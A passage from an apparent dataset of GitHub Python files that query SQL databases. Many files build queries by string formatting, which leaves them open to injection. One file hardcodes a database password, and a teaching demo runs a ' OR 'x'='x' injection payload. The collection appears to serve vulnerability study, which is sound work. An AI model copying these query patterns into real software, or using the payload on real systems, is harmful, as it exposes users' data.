start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    print \"Swiss matchups complete.\"\n    connection.commit()\n    cursor.close()\n    connection.close()\n    status = 0\n    return player_pairs\n\n\ndef deleteMatch(match=\"\"):\n    \"\"\"\n    Delete an existing match. We expect the following:\n    - Match ID\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    if not match:\n        raise ValueError(\"An ID # is required.\")\n    start = time.time()\n    cursor.execute(\"DELETE FROM matches where id=%s\", (match,))\n    stop = time.time()\n\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef deleteMatches():\n    \"\"\"\n    Delete ALL matches from the database.\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    cursor.execute(\"TRUNCATE matches;\")\n    stop = time.time()\n\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef latest_match():\n    \"\"\"\n    Get the latest match's information\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    print \"The Latest Match\"\n    name = ''\n    count = 0\n    returned_id = 0\n    start = time.time()\n    cursor.execute(\"SELECT * FROM matches ORDER BY id DESC LIMIT 1\")\n    results = cursor.fetchall()\n    # Generate the table\n    table = PrettyTable(['#', 'ID#', 'P1 ID', 'P2 ID', 'WINNER', 'TIME'])\n    table.align = 'l'\n    for row in results:\n        count += 1\n        # Generate the rows for the table\n        cursor.execute(\"SELECT * FROM players \"\n                       \"WHERE code=\\'%s\\'\", (row[3],))\n        player = cursor.fetchall()\n        for entry in player:\n            name = entry[1]\n        if name == '':\n            name = \"[PLAYER DELETED]\"\n        table.add_row([count, row[0], row[1], row[2], name, row[4]])\n        returned_id = row[0]\n    print table\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Returned %s results in %s seconds\" % (count, dur[:5])\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return returned_id\n\n\ndef playerStandings():\n    \"\"\"\n    Rank players by the number of wins. Get the list of wins and total\n    matches for each player.\n    \"\"\"\n    count = 0\n    returned_blob = []\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    cursor.execute(\"SELECT * from players;\")\n    player_blob = cursor.fetchall()\n    table = PrettyTable([\"ID\", \"PLAYER\", \"WINS\", \"MATCHES\"])\n    table.align = \"l\"\n    for player in player_blob:\n        count += 1\n        # Count the number of times the player has won (they are present in\n        # player_1 column inside tournament.matches).\n        cursor.execute(\"SELECT count(*) \"\n                       \"FROM matches \"\n                       \"WHERE player_1='%s'\", (player[3],))\n        wins_blob = cursor.fetchall()\n        wins_num = wins_blob[0][0]\n        # Count the number of times the player has lost (they are present in\n        # player_2 column inside tournament.matches).\n        cursor.execute(\"SELECT count(*) \"\n                       \"FROM matches \"\n                       \"WHERE player_2='%s'\", (player[3],))\n        losses_blob = cursor.fetchall()\n        matches_num = losses_blob[0][0] + wins_num\n        table.add_row([player[0], player[1], wins_num, matches_num])\n        returned_blob.append([player[0], player[1], wins_num, matches_num])\n    print table\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Returned %s results in %s seconds\" % (count, dur[:5])\n    return returned_blob\n\n\ndef countPlayers():\n    \"\"\"A function needed to fulfill the requirements of Udacity's\n    tournament_test.py. This function gets used to count the number of\n    players in the Players table.\"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    cursor.execute(\"SELECT COUNT(id) FROM players;\")\n    result = cursor.fetchall()\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return result[0][0]\n\n\ndef argument_parser():\n    \"\"\"\n    Using command-line arguments to control actions. User can use flags to run\n    certain, pre-defined scenarios. This will also allow for reuse of code where\n    applicable.\n    \"\"\"\n    parser = arg.ArgumentParser(description=cfg.APP_DESCRIPTION)\n\n    # NEW PLAYER function\n    parser.add_argument('--new-player', '-n',\n                        dest='registerPlayer',\n                        action='store',\n                        nargs='+',\n                        metavar='FIRST LAST COUNTRY',\n                        help='Create a new player.')\n\n    # NEW MATCH function\n    parser.add_argument('--new-match', '-m',\n                        dest='new_match',\n                        action='store',\n                        nargs=\"+\",\n                        metavar='ID#1 ID#2',\n                        help='Create a new match. Provide two player IDs.')\n\n    # SWISS MATCHUP function\n    parser.add_argument('--swiss-match', '-s',\n                        dest='swissPairings',\n                        action='store_true',\n                        default=False,\n                        help='Create a new match with swiss pairing.')\n\n    # GET LATEST RESULTS function\n    parser.add_argument('--latest-match', '-l',\n                        dest='latest_match',\n                        action='store_true',\n                        default=False,\n                        help='Get the results from the latest match.')\n\n    # DELETE PLAYER function\n    parser.add_argument('--delete-player', '-d',\n                        dest='deletePlayer',\n                        action='store',\n                        metavar='ID',\n                        help='Remove a player from the match system.')\n\n    # EDIT PLAYER function\n    parser.add_argument('--edit-player', '-e',\n                        dest='editPlayer',\n                        action='store',\n                        nargs='+',\n                        metavar='ID NEWNAME NEWCOUNTRY',\n                        help='Edit a player\\'s exiting information.')\n\n    # DELETE MATCH function\n    parser.add_argument('--delete-match', '-f',\n                        dest='deleteMatch',\n                        action='store',\n                        metavar='ID',\n                        help='Remove a match from the match system.')\n\n    # LIST PLAYERS function\n    parser.add_argument('--list-players', '-p',\n                        dest='list_players',\n                        action='store_true',\n                        default=False,\n                        help='List all players.')\n\n    # LIST RANKED function\n    parser.add_argument('--list-ranking', '-t',\n                        dest='list_ranking',\n                        action='store_true',\n                        default=False,\n                        help='List rankings.')\n\n    return parser\n\n\n# ROUTING LOGIC #\ndef main():\n    parser = argument_parser()\n    args = parser.parse_args()\n    if args.registerPlayer:\n        registerPlayer(player_name=(args.registerPlayer[0] + ' ' + args.registerPlayer[1]),\n                   country=args.registerPlayer[2])\n\n    if args.new_match:\n        players = args.new_match\n        reportMatch(p1=players[0], p2=players[1])\n\n    if args.swiss_match:\n        swissPairings()\n\n    if args.deletePlayer:\n        deletePlayer(player=str(args.delete_player))\n\n    if args.editPlayer:\n        name = \"%s %s\" % (args.editPlayer[1], args.editPlayer[2])\n        editPlayer(player=str(args.editPlayer[0]),\n                    new_name=name, new_country=args.editPlayer[3])\n\n    if args.list_players:\n        list_players()\n\n    if args.deleteMatch:\n        deleteMatch(match=str(args.deleteMatch))\n\n    if args.latest_match:\n        latest_match()\n\n    if args.list_ranking:\n        playerStandings()\n\n    # IF NO ARGUMENTS #\n\n    # Print all options.\n\n    if len(sys.argv) == 1:\n        parser.print_help()\n\n\nif __name__ == \"__main__\":\n    check_version(sys.version_info)\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Optissimum/swiss-tournament-api/blob/3b65c592858a5d7f5582ff38d862e794a925a6fc",
        "file_path": "/vagrant/forum/forumdb.py",
        "source": "#\n# Database access functions for the web forum.\n#\n\nimport time\nimport psycopg2\n\n## Get posts from database.\ndef GetAllPosts():\n    conn = psycopg2.connect(\"dbname=forum\")\n    cur = conn.cursor()\n    # Grabs all of our posts from our the DB\n    cur.execute(\"SELECT time, content FROM posts ORDER BY time desc\")\n    # Processes our fecthall into a dicitonary\n    posts = ({'content': str(row[1]), 'time': str(row[0])}\n    for row in cur.fetchall())\n    conn.close()\n    return posts\n\n## Add a post to the database.\ndef AddPost(content):\n    conn = psycopg2.connect(\"dbname=forum\")\n    cur = conn.cursor()\n    cur.execute(\"INSERT INTO posts (content) VALUES ('%s')\" % content)\n    conn.commit()\n    conn.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/steve2/COMP4350/blob/8625c75c85350e4e6c11966a5cd8d15ac95d0311",
        "file_path": "/Server/backend/database.py",
        "source": "#===========================================================================\n# database.py\n# \n# Notes:\n#\t- Code interacts with MySQL database.\n#\t- Returns objects in JSON format for sending to client.\n#\n#===========================================================================\n\n#\n# Dependencies\n#==============\nimport MySQLdb\n\n#\n# Constants\n#============\nHOST_NAME = \"localhost\"\nUSER_NAME = \"COMP4350_admin\"\nUSER_PASS = \"admin\"\nTABL_NAME = \"COMP4350_GRP5\"\n\n#***************************************************************************\n#***************************************************************************\n\ndef print_players():\n\tdb = MySQLdb.connect(HOST_NAME, USER_NAME, USER_PASS, TABL_NAME)\n\tc = db.cursor()\n\tc.execute(\"SELECT * FROM Player\")\n\tprint \"\\nPython-MySQL Result Object\\n=============================\"\n\tresult = cursor.fetchone()\n\twhile (result != None):\n\t\tprint \"- \", result, \"\\n\"\n\t\tresult = c.fetchone()\n\tprint \"----\\n\"\n\tdb.close()\n\ndef get_player(username):\n\tdb = MySQLdb.connect(HOST_NAME, USER_NAME, USER_PASS, TABL_NAME)\n\tc = db.cursor()\n\tc.execute(\"SELECT * FROM Player WHERE Username = \\\"\" + username + \"\\\"\")\n\tresult = c.fetchone()\n\tdb.close()\n\treturn result\n\t\nprint \"\\nOutput:\\n\"\nprint (get_player(\"steve\"))\nprint \"\\n\"",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/PythonCHB/PythonCertSpring/blob/2327b0b6ea40e45769606354084fe213dbb975c9",
        "file_path": "/sql_demo.py",
        "source": "#! /usr/bin/env python\n#\n# An SQL demo.  This builds a simple customer database\n# However, it will work with either sqlite3 or mysql\n# The hierarchy of objects is\n# business CONTAINS databases\n# databases CONTAINS tables\n# tables CONTAINS records\n# records CONTAINS fields\n\nimport datetime\nimport sys\nimport string\n\ndef print_users_by_state(state):\n    cursor.execute(\"\"\"SELECT first_name, last_name, city, state FROM customer where state=\"%s\";\"\"\"%state)\n    for row in cursor.fetchall():\n        print row[0],row[1],row[2],row[3]\n\ndef get_credentials(db) :\n    \"\"\"This function opens the credentials file, which is under the control of the system\nadministrator.  The software engineer cannot see it\"\"\"\n    credentials_file = 'credentials_file.txt'\n    try :\n        f = open(credentials_file,'r')\n    except IOError, e:\n        print \"\"\"Problems opening the credentials file %s - check file protection\nand EUID this database is running under\"\"\"\n        sys.exit(1)\n    credentials = f.readlines()\n    lineno = 0\n    for c in credentials :\n        lineno += 1\n        fields = c.split(\":\")\n        if len(fields) != 4 :\n            raise ValueError(\"Line %d of file %s has the wrong number of fields,\\\nshould be 4 actually is %d\" % (lineno, credentials_file, len(fields) ))\n        if fields[0] == db :\n            fields[3] = string.strip( fields[3] )\n            f.close()\n            return fields[1:4]\n    else :\n        raise ValueError(\"The credentials file %s does not contain a host/user/password tuple\\\nfor database %s\") % ( credentials, db)\n    f.close()\n    return\n\ndef populate_database() :\n    \"\"\"This subroutine populates the database.  Note that cursor and connection are passed globally\"\"\"\n    today = datetime.date.today()\n\n    customers=[\\\n        (\"Jeff\",\"Silverman\",\"924 20th AVE E\",\"\",\"Seattle\",\"WA\",\"98112\", today, \"1\"),\n        (\"Robin\",\"Finch\",\"The Aviary\",\"1100 Nowhere st\",\"Utopia\",\"KS\",\"75024\", today, \"2\"),\n        (\"Felix\",\"Felis\",\"1103 SW 23rd st\",\"\",\"Chicago\",\"IL\",\"68123\", today, \"3\"),\n        (\"Jay\",\"Inslee\",\"Governors Mansion\",\"Capitol Grounds\", \"Olympia\", \"WA\", \"98501\", today, \"4\" ),\n        ]\n\n    try :\n        for customer in customers:\n            cursor.execute('''INSERT INTO customer (\n        first_name, last_name, address_1, address_2, city, state, zipcode, signup_date, customer_number)\n        VALUES ( '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', %s )''' % customer )\n    finally :  \n        connection.commit()\n\n   \ndef update_database( new_city, new_state, zipcode, customer_number ) :\n    \"\"\"This subroutine updates the database.  Note that cursor and connection are passed globally\"\"\"\n    \n\n    try :\n        cursor.execute('''UPDATE customer SET city=\"%s\", zipcode=\"%s\", state=\"IL\"\n                WHERE customer_number=%s ''' % ( new_city, zipcode, customer_number ) )\n    except sql.ProgrammingError,e :\n        print \"The update failed\"\n        raise\n    else :\n        print \"The update succeeded\"\n\n\n\ndef update_database_better ( new_city, new_state, zipcode, customer_number ) :\n    \"\"\"This subroutine updates the database.  Note that cursor and connection are passed globally\nThis version is better because it sanitizes the input customer_number\"\"\"\n    \n\n    try :\n        customer_number = int ( customer_number ) # Guarantees that the customer number will be an integer\n        cursor.execute('''UPDATE customer SET city=\"%s\", zipcode=\"%s\", state=\"IL\"\n                WHERE customer_number=%s ''' % ( new_city, zipcode, customer_number ) )\n    except ValueError, e :\n        print \"Converting the customer number to an integer caused a ValueError exception.  %s\" % \\\n        customer_number\n        raise\n    except sql.ProgrammingError,e :\n        print \"The update failed\"\n        raise\n    else :\n        print \"The update succeeded\"\n\n\nargv1 = str.lower(sys.argv[1])\nif argv1 == \"sqlite3\" :\n    import sqlite3 as sql\n    connection = sql.connect('business.db')\nelif argv1 == \"mysql\" :\n    import MySQLdb as sql\n    DB = 'business'\n    (host, user, password ) = get_credentials(DB)\n    connection = sql.connect(host=host, user=user, passwd=password, db=DB)\nelse :\n    print \"Usage is \\npython %s sqlite3\\nor\\npython %s mysql\\n\" % ( sys.argv[0],\n                                                                    sys.argv[0] )\n    sys.exit(1)\n    \ncursor = connection.cursor()\n\n# Since we are starting from scratch, delete the table if it already exists.\ncursor.execute(\"\"\"DROP TABLE IF EXISTS customer\"\"\")\n\ncursor.execute(\"\"\"CREATE TABLE customer  (\nfirst_name VARCHAR(15) NOT NULL,\nlast_name VARCHAR(15) NOT NULL,\naddress_1 VARCHAR(30) NOT NULL,\naddress_2 VARCHAR(30),\ncity VARCHAR(20) NOT NULL,\nstate CHAR(2) NOT NULL,\nzipcode CHAR(5) NOT NULL,\nsignup_date DATE,\ncustomer_number INT ) \"\"\")\n\npopulate_database()\n\nprint_users_by_state(\"WA\")\n\nnew_city=\"Cairo\"\nnew_state=\"IL\"\nzipcode=\"62914\"\ncustomer_number = \"3\"\n\nupdate_database(new_city, new_state, zipcode, customer_number)\n\nprint_users_by_state(\"IL\")\n\nif len(sys.argv) == 3 and sys.argv[2]==\"evil\" :\n    \"\"\"Let's do an SQL injection attack\"\"\"\n    new_city=\"Aurora\"\n    new_state=\"IL\"\n    zipcode=\"60503\"\n    customer_number = \"3\"\n    evil = \" OR 'x'='x'\"\n    try :\n        update_database ( new_city, new_state, zipcode, customer_number + evil )\n    except sql.ProgrammingError,e :\n        print \"The SQL injection attack failed\"\n    else :\n        print \"The SQL injection attack succeeded\"\n\n    print_users_by_state(\"IL\")\n    new_city=\"Miami\"\n    new_state=\"FL\"\n    zipcode=\"33101\"\n    customer_number = \"3\"\n    try :\n        update_database_better ( new_city, new_state, zipcode, customer_number + evil )\n    except sql.ProgrammingError,e :\n        print \"The SQL injection attack failed\"\n    except ValueError,e :\n        print \"The SQL injection attack was prevented\"\n    else :\n        print \"The SQL injection attack succeeded\"\n\n    print_users_by_state(\"FL\")\n                       \nconnection.close()\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/codebleeder/forum-server/blob/9b9f25a6b206d1ffa2430a1899e09b7b094e9d0f",
        "file_path": "/login.py",
        "source": "#!/usr/bin/env python\n\nimport cgi\nimport sqlite3\nimport os\nimport hashlib\nimport uuid\n\n\ndef generate_hash(password):\n    salt = uuid.uuid4().hex\n    hash_val = hashlib.sha256(salt.encode() + password.encode()).hexdigest()\n    return hash_val, salt\n\n\ndef check_password(hash_salt, password_input):\n    return hash_salt[0] == hashlib.sha256(hash_salt[1].encode()+password_input.encode()).hexdigest()\n\n\ndef get_active_user():\n    conn = sqlite3.connect('server.db')\n    c = conn.cursor()\n    cmd = \"SELECT username FROM users WHERE active = ?\"\n    c.execute(cmd, (1, ))\n    username = c.fetchone()[0]\n    conn.close()\n    return username\n\n\ndef auth_user(f):\n    username = f.getvalue('username')\n    password = f.getvalue('password')\n\n    conn = sqlite3.connect('server.db')\n    c = conn.cursor()\n    c.execute(\"SELECT hash, salt FROM users WHERE username = ?\", (username,))\n    hash_salt = c.fetchone()\n\n    if hash_salt is None:\n        print \"\"\" Sign up for a new account:\n        <a href=\"http://localhost:8000/index.py\">Go back/a>\"\"\"\n    elif check_password(hash_salt, password):\n        print \"\"\" password authentication successful!\"\"\"\n        c.execute(\"UPDATE users SET active = ? WHERE username = ?\", (1, username))\n        conn.commit()\n        conn.close()\n        display_user_page()\n    else:\n        print \"\"\" wrong password! Try again:\n        <a href=\"http://localhost:8000/index.py\">Log in</a>\"\"\"\n\n\ndef display_user_page():\n    \"\"\" HTML boilerplate of forms, files listing, status of operation \"\"\"\n    username = get_active_user()\n    print \"\"\"\n    <h1>%s</h1>\n    ----------------------------------------------------------------------\"\"\" % username\n    files_path = './files/'+username\n    file_list = os.listdir(files_path)\n\n    print \"\"\" <h2><a href=\"http://localhost:8000/index.py?log_out=1\">Log out</a></h2>\n    -----------------------------------------------------------------------\"\"\"\n    print \"\"\" <h2> Change password </h2>\n        <form method=\"post\" action=\"login.py\">\n                new password:<input type=\"text\" name=\"new_password\"><br/>\n                confirm new password:<input type=\"text\" name=\"confirm_new_password\"><br/>\n                <input type=\"submit\" value=\"Submit\">\n        </form>\n    -----------------------------------------------------------------------\"\"\"\n    print \"\"\"\n    <h2> Upload File </h2>\n    <form enctype=\"multipart/form-data\" action=\"login.py\" method=\"post\">\n        <p>File: <input type=\"file\" name=\"filename\" /></p>\n        <p><input type=\"submit\" value=\"Upload\" /></p>\n    </form>\n    ----------------------------------------------------------------------\"\"\"\n    print \"\"\"\n    <h2> Delete File </h2>\n    <form action=\"login.py\" method=\"post\" target=\"_blank\">\n    <select name=\"dropdown\">\"\"\"\n    #<option value=\"Maths\" selected>Maths</option>\n    for i in file_list:\n        print \"<option value=%s selected>%s</option>\" % (i, i)\n    print \"\"\"\n    </select>\n    <input type=\"submit\" value=\"Delete\"/>\n    </form>\n    ----------------------------------------------------------------------\"\"\"\n    print \"<h2> file list </h2>\"\n    for i in file_list:\n        print \"<h4>%s</h4>\" % (i, )\n        print \"\"\"\n        <form method=\"get\" action=%s>\n        <button type=\"submit\">Download!</button>\n        </form>\n        \"\"\" % ('./files/'+username+'/'+i, )\n\n\ndef check_file_ext(file_name):\n    return file_name[-3:] == 'txt' or file_name[-3:] == 'log' or file_name[-3:] == 'pdf'\n\n\ndef upload_file(f):\n    username = get_active_user()\n\n    file_item = f['filename']\n    # Test if the file was uploaded\n    if file_item.filename:\n        # strip leading path from file name to avoid\n        # directory traversal attacks\n        fn = os.path.basename(file_item.filename)\n        if check_file_ext(fn):\n            file_path = './files/'+username+'/' + fn\n            open(file_path, 'wb').write(file_item.file.read())\n            message = '<h3>The file \"' + fn + '\" was uploaded successfully</h3>'\n        else:\n            message = '<h3> Only files with extension txt/pdf/log will be accepted'\n    else:\n        message = '<h3>No file was uploaded</h3>'\n    print message\n    display_user_page()\n\n\ndef delete_file(f):\n    username = get_active_user()\n    if form.getvalue('dropdown'):\n        file_name = form.getvalue('dropdown')\n        file_path = './files/'+username+'/'+file_name\n        os.remove(file_path)\n        message = 'removed ', file_name\n    else:\n        message = \"Not entered\"\n\n    print message\n    display_user_page()\n\n\ndef change_password(f):\n    username = get_active_user()\n    new_password = f.getvalue('new_password')\n    confirm_new_password = f.getvalue('confirm_new_password')\n    if new_password == confirm_new_password and len(new_password) >= 6 and username != new_password:\n        new_hash_salt = generate_hash(new_password)\n        conn = sqlite3.connect('server.db')\n        c = conn.cursor()\n        c.execute(\"SELECT hash, salt FROM users WHERE username = ?\", (username, ))\n        old_hash_salt = c.fetchone()\n        if old_hash_salt == new_hash_salt:\n            message = 'old and new passwords are the same! try again'\n        else:\n            c.execute(\"UPDATE users SET hash = ?, salt = ? WHERE username = ?\", (new_hash_salt[0], new_hash_salt[1], username))\n            conn.commit()\n            message = 'password change successful!'\n        conn.close()\n    else:\n        message = \"passwords don't match! or\" \\\n                  \"length should be atleast 6 characters or\" \\\n                  \"password is same as username\" \\\n                  \" try again!\"\n    print message\n    display_user_page()\n\n\n# main\nform = cgi.FieldStorage()\nprint \"\"\"Content-type: text/html\\r\\n\\r\\n\"\"\"\n\nif 'username' in form and 'password' in form:\n    auth_user(form)\nelif 'filename' in form:\n    upload_file(form)\nelif 'dropdown' in form:\n    delete_file(form)\nelif 'new_password' in form and 'confirm_new_password' in form:\n    change_password(form)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/lord63/a_bunch_of_code/blob/426be293e5c01c01cb0e54c0cbe1a5313aa1fcc5",
        "file_path": "/comics/check_comics.py",
        "source": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport sqlite3\nfrom os import path\nimport sys\n\nimport requests\nfrom bs4 import BeautifulSoup\n\nconnect = sqlite3.connect(path.join(sys.path[0], 'comics.db'))\ncursor = connect.cursor()\n\ndef check(current_num):\n    try:\n        cursor.execute('SELECT * FROM comics WHERE num=\"%s\"' % current_num)\n    except sqlite3.OperationalError:\n        cursor.execute('CREATE TABLE comics (num text)')\n        return False\n    else:\n        return False if cursor.fetchone() is None else True\n\nnaruto_comics = 'http://www.tvimm.com/NARUTO.html#1'\nr = requests.get(naruto_comics)\nsoup = BeautifulSoup(r.text)\nnum = soup.find('a', target='_blank')['href'].split('/')[-1]\nif check(num):\n    print 'NARUTO: not updated yet.'\nelse:\n    print 'NARUTO: has been updated to', num\n    cursor.execute('INSERT INTO comics VALUES (\"%s\")' % num)\n    connect.commit()\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cheshire3/cheshire3/blob/2a358b8a906b873791e75aef81030f4f80e55fc3",
        "file_path": "/cheshire3/sql/postgresStore.py",
        "source": "\"\"\"PosgreSQL Store Abstract Classes.\"\"\"\n\n# Consider psycopg\nimport pg\nimport time\nfrom lxml import etree\n\nfrom cheshire3.baseStore import SimpleStore\nfrom cheshire3.exceptions import *\nfrom cheshire3.utils import (\n    elementType,\n    getFirstData,\n    nonTextToken,\n    flattenTexts\n)\n\n# Shouldn't really be here, but haven't had time to investigate yet...\nfrom cheshire3.resultSet import SimpleResultSetItem\n\n\nclass PostgresIter(object):\n    \"\"\"Iterator for Cheshire3 PostgresStores.\"\"\"\n\n    store = None\n    cxn = None\n    idList = None\n    cursor = None\n\n    def __init__(self, session, store):\n        self.session = session\n        self.store = store\n        self.cxn = pg.connect(self.store.database)\n        query = (\"SELECT identifier FROM %s ORDER BY identifier ASC\" %\n                 (self.store.table))\n        query = query.encode('utf-8')\n        res = self.cxn.query(query)\n        all_ = res.dictresult()\n        self.idList = [item['identifier'] for item in all_]\n        self.cursor = 0\n\n    def __iter__(self):\n        return self\n\n    def next(self):\n        \"\"\"Return next data from Iterator\"\"\"\n        try:\n            query = (\"SELECT * FROM %s WHERE identifier='%s' LIMIT 1\" %\n                     (self.store.table, self.idList[self.cursor]))\n            query = query.encode('utf-8')\n            res = self.cxn.query(query)\n            self.cursor += 1\n            d = res.getresult()[0]\n            while d and (d[0][:2] == \"__\"):\n                query = (\"SELECT * FROM %s WHERE identifier='%s' LIMIT 1\" %\n                         (self.store.table, self.idList[self.cursor]))\n                query = query.encode('utf-8')\n                res = self.cxn.query(query)\n                self.cursor += 1\n                d = res.getresult()[0]\n\n            if not d:\n                raise StopIteration()\n            return d\n        except IndexError:\n            raise StopIteration()\n\n\nclass PostgresStore(SimpleStore):\n    \"\"\"Cheshire3 object storage abstraction for PostgreSQL.\"\"\"\n\n    cxn = None\n    relations = {}\n\n    _possiblePaths = {\n        'databaseName': {\n            'docs': \"Database in which to store the data\"\n        },\n        'tableName': {\n            'docs': \"Table in the database in which to store the data\"\n        }\n    }\n    # , 'idNormalizer'  : {'docs' : \"\"}}\n\n    def __init__(self, session, config, parent):\n        SimpleStore.__init__(self, session, config, parent)\n        self.database = self.get_path(session, 'databaseName', 'cheshire3')\n        self.table = self.get_path(session,\n                                   'tableName',\n                                   parent.id + '_' + self.id\n                                   )\n        self.idNormalizer = self.get_path(session, 'idNormalizer', None)\n        self._verifyDatabases(session)\n        self.session = session\n\n    def __iter__(self):\n        # Return an iterator object to iter through\n        return PostgresIter(self.session, self)\n\n    def _handleConfigNode(self, session, node):\n        if (node.nodeType == elementType and node.localName == 'relations'):\n            self.relations = {}\n            for rel in node.childNodes:\n                if (\n                    rel.nodeType == elementType and\n                    rel.localName == 'relation'\n                ):\n                    relName = rel.getAttributeNS(None, 'name')\n                    fields = []\n                    for fld in rel.childNodes:\n                        if fld.nodeType == elementType:\n                            if fld.localName == 'object':\n                                oid = getFirstData(fld)\n                                fields.append([oid, 'VARCHAR', oid])\n                            elif fld.localName == 'field':\n                                fname = fld.getAttributeNS(None, 'name')\n                                ftype = getFirstData(fld)\n                                fields.append([fname, ftype, ''])\n                    self.relations[relName] = fields\n        #- end _handleConfigNode --------------------------------------------\n\n    def _handleLxmlConfigNode(self, session, node):\n        if node.tag in ['relations', '{%s}relations' % CONFIG_NS]:\n            self.relations = {}\n            for rel in node.iterchildren(tag=etree.Element):\n                if rel.tag in ['relation', '{%s}relation' % CONFIG_NS]:\n                    relName = rel.attrib.get('name', None)\n                    if relName is None:\n                        raise ConfigFileException('Name not supplied for '\n                                                  'relation')\n                    fields = []\n                    for fld in rel.iterchildren(tag=etree.Element):\n                        if fld.tag in ['object', '{%s}object' % CONFIG_NS]:\n                            oid = flattenTexts(fld)\n                            fields.append([oid, 'VARCHAR', oid])\n                        elif fld.tag in ['field', '{%s}field' % CONFIG_NS]:\n                            fname = fld.attrib.get('name', None)\n                            if fname is None:\n                                ConfigFileException('Name not supplied for '\n                                                    'field')\n                            ftype = flattenTexts(fld)\n                            fields.append([fname, ftype, ''])\n\n                    self.relations[relName] = fields\n        #- end _handleLxmlConfigNode ----------------------------------------\n\n    def _verifyDatabases(self, session):\n        try:\n#            self.cxn = pg.connect(self.database)\n            self._openContainer(session)\n        except pg.InternalError as e:\n            raise ConfigFileException(\"Cannot connect to Postgres: %r\" %\n                                      e.args)\n\n        try:\n            query = \"SELECT identifier FROM %s LIMIT 1\" % self.table\n            res = self._query(query)\n        except pg.ProgrammingError as e:\n            # no table for self, initialise\n            query = \"\"\"\n            CREATE TABLE %s (identifier VARCHAR PRIMARY KEY,\n            data BYTEA,\n            digest VARCHAR(41),\n            byteCount INT,\n            wordCount INT,\n            expires TIMESTAMP,\n            tagName VARCHAR,\n            parentStore VARCHAR,\n            parentIdentifier VARCHAR,\n            timeCreated TIMESTAMP,\n            timeModified TIMESTAMP);\n            \"\"\" % self.table\n            self._query(query)\n\n        # And check additional relations\n        for (name, fields) in self.relations.iteritems():\n            try:\n                query = (\"SELECT identifier FROM %s_%s LIMIT 1\" %\n                         (self.table, name))\n                res = self._query(query)\n            except pg.ProgrammingError as e:\n                # No table for relation, initialise\n                query = (\"CREATE TABLE %s_%s (identifier SERIAL PRIMARY KEY, \"\n                         \"\" % (self.table, name)\n                         )\n                for f in fields:\n                    query += (\"%s %s\" % (f[0], f[1]))\n                    if f[2]:\n                        # Foreign Key\n                        query += (\" REFERENCES %s (identifier) ON DELETE \"\n                                  \"cascade\" % f[2]\n                                  )\n                    query += \", \"\n                query = query[:-2] + \") ;\"\n                res = self._query(query)\n\n    def _openContainer(self, session):\n        if self.cxn is None:\n            self.cxn = pg.connect(self.database)\n\n    def _closeContainer(self, session):\n        if self.cxn is not None:\n            self.cxn.close()\n            del self.cxn\n            self.cxn = None\n\n    def _query(self, query):\n        if self.cxn is None:\n            self.cxn = pg.connect(self.database)\n        query = query.encode('utf-8')\n        res = self.cxn.query(query)\n        return res\n\n    def begin_storing(self, session):\n        self._openContainer(session)\n        return None\n\n    def commit_storing(self, session):\n        self._closeContainer(session)\n        return None\n\n    def generate_id(self, session):\n        self._openContainer(session)\n        # Find greatest current id\n        if (self.currentId == -1 or session.environment == 'apache'):\n            query = (\"SELECT CAST(identifier AS int) FROM %s ORDER BY \"\n                     \"identifier DESC LIMIT 1;\" % self.table)\n            res = self._query(query)\n            try:\n                id = int(res.dictresult()[0]['identifier']) + 1\n            except:\n                id = 0\n            self.currentId = id\n            return id\n        else:\n            self.currentId += 1\n            return self.currentId\n\n    def store_data(self, session, id, data, metadata={}):\n        self._openContainer(session)\n        id = str(id)\n        now = time.strftime(\"%Y-%m-%d %H:%M:%S\")\n        if (self.idNormalizer is not None):\n            id = self.idNormalizer.process_string(session, id)\n        data = data.replace(nonTextToken, '\\\\\\\\000\\\\\\\\001')\n\n        query = (\"INSERT INTO %s (identifier, timeCreated) VALUES \"\n                 \"('%s', '%s');\" % (self.table, id, now))\n        try:\n            self._query(query)\n        except:\n            # Already exists\n            pass\n        try:\n            ndata = pg.escape_bytea(data)\n        except:\n            # Insufficient PyGreSQL version\n            ndata = data.replace(\"'\", \"\\\\'\")\n\n        if metadata:\n            extra = []\n            for (n, v) in metadata.iteritems():\n                if type(v) in (int, long):\n                    extra.append('%s = %s' % (n, v))\n                else:\n                    extra.append(\"%s = '%s'\" % (n, v))\n            extraq = ', '.join(extra)\n            query = (\"UPDATE %s SET data = '%s', %s, timeModified = '%s' \"\n                     \"WHERE identifier = '%s';\" %\n                     (self.table, ndata, extraq, now, id)\n                     )\n        else:\n            query = (\"UPDATE %s SET data = '%s', timeModified = '%s' \"\n                     \"WHERE  identifier = '%s';\" %\n                     (self.table, ndata, now, id)\n                     )\n        try:\n            self._query(query)\n        except pg.ProgrammingError:\n            # Uhhh...\n            print query\n            raise\n        return None\n\n    def fetch_data(self, session, id):\n        self._openContainer(session)\n        sid = str(id)\n        if 